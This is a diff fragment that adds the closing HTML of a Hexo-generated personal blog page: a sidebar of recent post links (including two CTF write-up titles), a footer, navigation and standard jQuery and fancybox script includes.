+            <a href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">网鼎杯2020-小知识点</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/21/HFCTF2020-uploadBaby/">HFCTF2020-uploadBaby</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">C语言实现学生信息管理系统</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 AFKL<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
